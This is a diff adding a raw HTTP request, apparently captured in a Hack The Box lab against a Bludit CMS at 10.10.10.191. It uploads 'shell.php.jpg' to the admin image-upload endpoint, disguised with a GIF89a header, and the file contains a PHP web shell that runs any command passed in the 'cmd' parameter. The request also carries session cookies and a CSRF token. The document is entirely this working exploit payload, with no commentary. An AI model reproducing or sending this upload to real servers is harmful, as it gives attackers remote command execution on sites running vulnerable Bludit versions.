@@ -1,0 +1,31 @@
+POST /admin/ajax/upload-images HTTP/1.1
+Host: 10.10.10.191
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------399765236230210093502422579214
+Content-Length: 566
+Origin: http://10.10.10.191
+Connection: close
+Referer: http://10.10.10.191/admin/new-content
+Cookie: BLUDITREMEMBERUSERNAME=fergus; BLUDITREMEMBERTOKEN=d80a4396b1fde54dc8530a9ba0ecfdcc; BLUDIT-KEY=7vfi1jvfr52e9l0q0vj3d5n9a3
+
+-----------------------------399765236230210093502422579214
+Content-Disposition: form-data; name="images[]"; filename="shell.php.jpg"
+Content-Type: image/jpeg
+
+GIF89a
+<?php system($_GET['cmd']); ?>
+
+
+-----------------------------399765236230210093502422579214
+Content-Disposition: form-data; name="uuid"
+
+f0ac8fb97dbed49c12cfc7063b25a37d
+-----------------------------399765236230210093502422579214
+Content-Disposition: form-data; name="tokenCSRF"
+
+876c7ea9535926e73919a392cb1ead01de147b14
+-----------------------------399765236230210093502422579214--
